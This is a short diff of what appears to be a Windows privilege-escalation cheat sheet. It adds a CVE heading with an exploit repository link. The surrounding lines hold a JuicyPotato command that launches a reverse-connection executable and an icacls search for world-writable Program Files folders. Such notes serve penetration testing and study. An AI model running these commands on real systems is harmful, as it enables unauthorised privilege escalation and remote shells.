@@ -20,6 +20,10 @@ whoami /priv
 .\JuicyPotato.exe -l <port> -p <reverseConnection>.exe -c {4991d34b-80a1-4291-83b6-3328366b9097} -t *
 
 
+### CVE-2020-34481
+https://github.com/jacob-baines/concealed_position 
+
+
 ### Scheduled Tasks
 # are there folder with full permissions
 icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
